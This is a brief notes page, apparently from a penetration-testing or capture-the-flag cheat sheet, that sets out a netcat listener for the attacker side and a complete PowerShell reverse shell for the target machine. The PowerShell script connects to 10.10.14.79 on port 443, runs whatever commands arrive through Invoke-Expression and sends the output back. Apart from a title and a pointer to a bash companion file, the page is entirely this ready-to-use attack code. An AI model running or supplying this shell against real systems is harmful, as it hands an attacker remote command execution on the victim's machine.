# powershell

**Author:** Julien Bongars\
**Date:** 2026-01-05 02:41:33
**Path:**

---

## Source Machine

```bash
nc -lvnp 443
```

## Target Machine

```ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.79',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

Refer ./bash.md for more
